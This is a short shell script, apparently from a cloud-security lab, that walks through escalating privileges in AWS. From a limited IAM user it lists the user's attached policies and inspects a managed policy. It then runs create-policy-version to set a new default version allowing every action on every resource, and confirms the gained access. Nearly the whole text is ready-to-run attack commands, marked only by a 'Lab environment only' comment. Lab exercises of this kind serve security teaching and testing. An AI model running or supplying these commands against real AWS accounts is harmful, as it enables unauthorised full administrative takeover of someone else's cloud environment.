# Verify current identity
aws sts get-caller-identity \
  --profile masterclasslimiteduser

# Test an IAM action before privilege escalation
aws iam list-users \
  --profile masterclasslimiteduser

# Identify policies attached to limiteduser
aws iam list-attached-user-policies \
  --user-name limiteduser \
  --profile masterclasslimiteduser

# Inspect the managed policy
aws iam get-policy \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --profile masterclasslimiteduser

# Inspect policy version v1
aws iam get-policy-version \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --version-id v1 \
  --profile masterclasslimiteduser

# Create a new policy version with elevated permissions
# Lab environment only
aws iam create-policy-version \
  --policy-arn "arn:aws:iam::<ACCOUNT-ID>:policy/policyversionmanager" \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default \
  --profile masterclasslimiteduser

# Verify that privileges have changed
aws iam list-users \
  --profile masterclasslimiteduser
